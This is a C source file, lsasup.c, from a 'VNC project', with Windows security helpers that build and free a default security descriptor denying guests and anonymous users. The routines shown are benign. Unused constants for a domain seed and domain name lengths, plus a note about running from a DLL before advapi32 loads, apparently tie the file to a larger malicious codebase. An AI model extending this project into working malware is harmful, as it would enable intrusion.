//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: lsasup.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//	 NT security support routines: user SID, ACL, SA and so on.

#define _ADVAPI_ALLOWED	TRUE

#include "main.h"
#include "lsasup.h"
#include "string.h"


SECURITY_ATTRIBUTES		g_DefaultSA = {0};

#define		uDomainSeed			0xEDB98930
#define		DOMAIN_NAME_LEN_MIN		12	
#define		DOMAIN_NAME_LEN_MAX		24


// If _ADVAPI_ALLOWED we can use a string formated DACL and initialize it using Advapi32!ConvertStringSecurityDescriptorToSecurityDescriptor
//  but when running from DLL advapi32 is not allowed (coz it's not initialized yet), so using predefined security descriptor.

// Default DACL string with the following access:
//     Built-in guests are denied all access.
//     Anonymous logon is denied all access.
//     Authenticated users are allowed 
//     read/write/execute access.
//     Administrators are allowed full control.
#ifndef _ADVAPI_ALLOWED

// The same DACL as in string but in initialized format: for use without advapi32.
static const unsigned char g_DefaultSD[] = {
	01, 00, 04, 0x80, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00,
    0x14, 00, 00, 00, 02, 00, 0x60, 00, 04, 00, 00, 00, 01, 03, 0x18, 00,
    00, 00, 00, 0x10, 01, 02, 00, 00, 00, 00, 00, 05, 0x20, 00, 00, 00,
	0x22, 02, 00, 00, 01, 03, 0x14, 00, 00, 00, 00, 0x10, 01, 01, 00, 00,
	00, 00, 00, 05, 07, 00, 00, 00, 00, 03, 0x14, 00, 00, 00, 00, 0x10,
	01, 01, 00, 00, 00, 00, 00, 05, 0x0b, 00, 00, 00, 00, 03, 0x18, 00,
	00, 00, 00, 0x10, 01, 02, 00, 00, 00, 00, 00, 05, 0x20, 00, 00, 00,
	0x20, 02, 00, 00 };
#endif


// Allocates a SECURITY_ATTRIBUTES structure with the default security descriptor desctibed above
BOOL LsaSupInitializeSecurityAttributes(PSECURITY_ATTRIBUTES pSa, LPTSTR DaclStr)
{
	BOOL Ret = TRUE;

	pSa->nLength = sizeof(SECURITY_ATTRIBUTES);
	pSa->bInheritHandle = FALSE;
#ifdef _ADVAPI_ALLOWED
	Ret = ConvertStringSecurityDescriptorToSecurityDescriptor(DaclStr, SDDL_REVISION_1, &pSa->lpSecurityDescriptor, NULL);
#else
	pSa->lpSecurityDescriptor = (LPVOID) &g_DefaultSD;
#endif
	
	return(Ret);
}

// Frees the default security descriptor previously allocated by the InitializeDefaultSecurityAttributes()
VOID LsaSupFreeSecurityAttributes(PSECURITY_ATTRIBUTES pSa)
{
#ifdef _ADVAPI_ALLOWED
	if (pSa->lpSecurityDescriptor)
		LocalFree(pSa->lpSecurityDescriptor);
#else
	UNREFERENCED_PARAMETER(pSa);
#endif
}




